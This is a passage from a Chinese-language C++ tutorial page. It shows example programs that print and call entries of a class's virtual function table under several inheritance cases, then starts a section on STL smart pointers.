class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_4...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_5...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_6</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_6...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//观察大小：虚函数表只有一个</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(sub));<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是就是虚函数表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th></th><th>虚函数表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>0x123456</td><td></td><td>Base1:Fn_1()</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td>0x123457</td><td></td><td>Base1:Fn_2()</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Base2:Fn_3()</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Base2:Fn_4()</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Sub:Fn_5()</td><td></td></tr><tr><td></td><td></td><td>其他成员</td><td></td><td>0x135466</td><td></td><td>Sub:Fn_6()</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td>00000000</td><td></td><td></td><td></td></tr></tbody></table><h3 id="情形3"><a href="#情形3" class="headerlink" title="情形3"></a>情形3</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span> :</span>Base1<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_5...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//观察大小：虚函数表只有一个</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(sub));<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是就是虚函数表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th></th><th>虚函数表</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>Base2:Fn_1</td><td>Base1:Fn_2</td><td>Base2:Fn_3</td><td>Sub:Fn_5</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="情形4"><a href="#情形4" class="headerlink" title="情形4"></a>情形4</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span> :</span>Base1<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_5...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//观察大小：虚函数表只有一个</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(sub));<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是就是虚函数表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th></th><th>虚函数表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>Sub:Fn_1</td><td>Base1:Fn_2</td><td>Base2:Fn_3</td><td>Sub:Fn_5</td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="情形5"><a href="#情形5" class="headerlink" title="情形5"></a>情形5</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span> :</span>Base1<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_3...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//观察大小：虚函数表只有一个</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(sub));<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是就是虚函数表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td>虚函数表</td><td></td><td></td><td></td></tr><tr><td></td><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>Sub:Fn_1</td><td>Base1:Fn_2</td><td>Sub:Fn_3</td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>主要是第一个情形要分清楚</p><p>其他几个都差不多</p><h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><p>Standard Template Library 标准模板库</p><p>前面讲的这些都是基础中的基础了，如果面试官往难了问一般问stl或者智能指针，但是一般不会问这些因为不是搞开发。。。</p><h2 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h2><p>unique_ptr  拥有独有对象所有权语义的智能指针</p><p>shared_ptr  拥有共享对象所有权语义的智能指针</p><p>weak_ptr    到 std::shared_ptr 所管理对象的弱引用</p><h3 id="unique-ptr-amp-amp-shared-ptr"><a href="#unique-ptr-amp-amp-shared-ptr" class="headerlink" title="unique_ptr &amp;&amp; shared_ptr"></a>unique_ptr &amp;&amp; shared_ptr</h3><p>unique_ptr和shared_ptr是俩个主要的智能指针</p><p>unique_ptr是通过指针占有并管理另一对象，并在 unique_ptr 离开作用域时释放该对象的智能指针。在下列两者之一发生时用关联的删除器释放对象</p><ul><li>销毁了管理的 unique_ptr 对象</li><li>通过 operator= 或 reset() 赋值另一指针给管理的 unique_ptr 对象。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">person</span></span><br><span class="hljs-class">&#123;</span><br>~person()<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span 